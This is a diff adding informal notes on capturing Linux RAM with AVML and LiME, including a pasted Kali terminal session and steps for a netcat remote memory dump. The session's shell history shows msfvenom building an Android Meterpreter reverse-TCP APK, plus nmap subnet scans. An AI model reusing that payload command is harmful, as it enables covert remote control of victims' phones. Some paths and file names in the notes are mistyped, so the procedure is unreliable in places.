@@ -1,0 +1,258 @@
+Linux - ram memory capture
+=====================================================================
+Linux memory forensics - memory capture with LiME and AVML
+---------------------------------------------------------------------
+
+
+
+Method - 1
+Tool - AVML
+
+web site for download -----------
+---------------------------------------------
+https:github.com/Microsoft/avml
+-----------------------------------------------------------------------
+---------- go releases at right side below , click on releases---------
+----- then upcoming page -- scroll down --- contribution below -
+----- Assets-----  then click on ---- avmi --- download -- in Linux --
+-----------------------------------------------------------------------
+-----------------------------------------------------------------------
+=====================================================
+=====================================================
+
+
+
+------------------------------------------------------------------------
+kali㉿kali)-[~]
+└─$ ls
+Desktop    IaPZVoHM.html  NLOioUbO.jpeg  Public
+Documents  IGtidmzS.jpeg  Pictures       Templates
+Downloads  Music          PkUQmNFg.html  Videos
+                                                                        
+┌──(kali㉿kali)-[~]
+└─$ cd Download 
+cd: no such file or directory: Download
+                                                                        
+┌──(kali㉿kali)-[~]
+└─$ cd Downloads
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls
+avml
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls -lh
+total 6.9M
+-rw-r--r-- 1 kali kali 6.9M Oct 27 03:20 avml
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ file avml               
+avml: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), static-pie linked, BuildID[sha1]=a06b9b46280911b93c2073ddc8e4741c2bcbafc5, stripped
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ./avml
+zsh: permission denied: ./avml
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ chmod a+x avml
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls -lh
+total 6.9M
+-rwxr-xr-x 1 kali kali 6.9M Oct 27 03:20 avml
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ./avml        
+error: the following required arguments were not provided:
+  <FILENAME>
+
+Usage: avml <FILENAME>
+
+For more information, try '--help'.
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ./avml caine.mem
+Error: error: unable to parse /proc/iomem
+caused by:
+    0: need CAP_SYS_ADMIN to read /proc/iomem
+
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ./avml caine.mem
+[sudo] password for kali: 
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ df -h  ,
+df: ,: No such file or directory
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ df -h  .
+Filesystem      Size  Used Avail Use% Mounted on
+/dev/sda1        79G   16G   60G  21% /
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo mount /dav/sdb1 /mnt/hd
+mount: /mnt/hd: mount point does not exist.
+       dmesg(1) may have more information after failed mount system call.
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo `/Downloads/avml caine0.mem
+bquote> 
+bquote> 
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo ~/Downloads/avml caine0.mem
+
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls -lh caine.mem
+-rw------- 1 root root 2.0G Oct 27 03:28 caine.mem
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls -lh caine0.mem
+-rw------- 1 root root 2.0G Oct 27 03:33 caine0.mem
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ free -h  
+               total        used        free      shared  buff/cache   available
+Mem:           1.9Gi       972Mi        79Mi        52Mi       920Mi       781Mi
+Swap:          1.0Gi       224Mi       799Mi
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ strings caine.mem | grep -i vanderlay
+strings: caine.mem: Permission denied
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo strings caine.mem | grep -i vanderlay
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls               
+avml  caine0.mem  caine.mem
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ history 
+    1  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.164 LPORT=8484 > test22.apk
+    2  msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.162 LPORT=8080 > test22.apk
+    3  msfconsole
+    4  ip a
+    5  firefox www.whatsapp.com
+    6  ip a
+    7  ping 192.168.176.153
+    8  nmap -Pn -vv -o 192.168.176.164/24
+    9  nmap -Pn -vv  192.168.176.164/24
+   10  msfconsole
+   11  ip a
+   12  msfconsole
+   13  history
+   14  ls
+   15  clear
+   16  ls
+   17  cd Download 
+   18  cd Downloads
+   19  ls
+   20  ls -lh
+   21  file avml
+   22  ./avml
+   23  chmod a+x avml
+   24  ls -lh
+   25  ./avml
+   26  ./avml caine.mem
+   27  sudo ./avml caine.mem
+   28  df -h  ,
+   29  df -h  .
+   30  sudo mount /dav/sdb1 /mnt/hd
+   31  sudo `/Downloads/avml caine0.mem\n
+   32  sudo ~/Downloads/avml caine0.mem\n
+   33  ls -lh caine.mem
+   34  ls -lh caine0.mem
+   35  free -h
+   36  strings caine.mem | grep -i vanderlay
+   37  sudo strings caine.mem | grep -i vanderlay
+   38  ls
+                                                                        
+┌──(kali㉿kali)-[~/Downloads]
+└─$ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+=======================================================
+=======================================================
+=======================================================
+=======================================================
+------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------
+Memory Extraction using LiME
+in Linux
+sudo apt-get install git gcc make
+
+sudo su
+
+pwd
+
+git clone https://github.com/504ensicslabs/LIME
+
+ls -la
+
+cd LIME/
+ls -la
+
+cd src/
+
+ls -la
+
+(complie soure code)
+
+make
+https://www.geeksforgeeks.org/linux-make-command/
+-----------------------------------------------------------------------------------
+make -C /lib/modules/6.0.0-kali3-amd64/build M="/home/kali/LIME/src" modules
+make[1]: *** /lib/modules/6.0.0-kali3-amd64/build: No such file or directory.  Stop.
+make: *** [Makefile:35: default] Error 2
+-----------------------------------------------------------------------------------
+
+(find there module file - Lime - 5.40.26-generic.ko)
+insmod /.lime-5.40.26-generic.ko "path=/root/memory.dump format=raw"
+
+===============================================================
+================================================================
+================================================================
+otherwise --------
+
+find / -name "*.ko"
+
+------------------------------------------------------------
+cd
+
+ls -la
+--------------------------------------
+create remote memory dump
+
+/LIME/src# insmod ./lime-5.4.0-26-generic.ko "path=tcp:443 format=raw"
+--------------------------------------------
+remote system----------
+nc target_ip port_no. >memory1.dump
+du -sh memory1.dump
+---------------------------------------------
+
+
+
+
+reference -----------------
+https://www.youtube.com/watch?v=imCHV2Hw0KI
+
+-----------------------------
+imp--
+https://www.youtube.com/watch?v=Llsoo8LHhWg
+------------------------------------------------------
+
